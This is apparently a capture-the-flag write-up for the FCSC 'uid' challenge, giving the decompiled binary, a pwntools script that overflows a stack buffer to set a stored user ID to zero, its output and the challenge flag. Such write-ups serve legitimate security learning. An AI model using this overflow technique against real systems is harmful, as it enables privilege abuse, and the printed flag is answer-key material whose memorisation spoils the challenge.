# Intro / uid

## Challenge
On vous demande d'exploiter le binaire fourni pour lire le fichier flag.txt qui se trouve sur le serveur distant.

## Inputs
- server at challenges.france-cybersecurity-challenge.fr:2100
- binary:  [uid](./uid)


## Solution
Disassembing the binary in `Ghidra` shows the following:
```c
undefined8 main(void)

{
  undefined local_38 [44];
  __uid_t local_c;
  
  local_c = geteuid();
  printf("username: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_0010200f,local_38);
  if (local_c == 0) {
    system("cat flag.txt");
  }
  else {
    system("cat flop.txt");
  }
  return 0;
}
```

Takeaways:
- effective UID is read and stored in a local variable
- some input is read from `stdin` without protection, so there's a buffer overflow here
- the local variable needs to be 0 to dump the flag

Because of the buffer overflow, we can modify the local variable on the stack and modify it to 0.

We can also automate the interaction with the server by using `pwntools` like so:
```python
from pwn import *

def flush():
    log.info(p.clean().decode().strip())

p = remote('challenges.france-cybersecurity-challenge.fr', 2100)
payload = flat(b'A' * 43, b'\0'*4)
flush(); p.sendline(payload); flush()
```

Here's the execution output:
```console
$ python3 sol.py
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2100: Done
[*] username:
[*] FCSC{3ce9bedca72ad9c23b1714b5882ff5036958d525d668cadeb28742c0e2c56469}
[*] Closed connection to challenges.france-cybersecurity-challenge.fr port 2100
```

## Python code
Complete solution in [sol.py](./sol.py)

## Flag
FCSC{3ce9bedca72ad9c23b1714b5882ff5036958d525d668cadeb28742c0e2c56469}
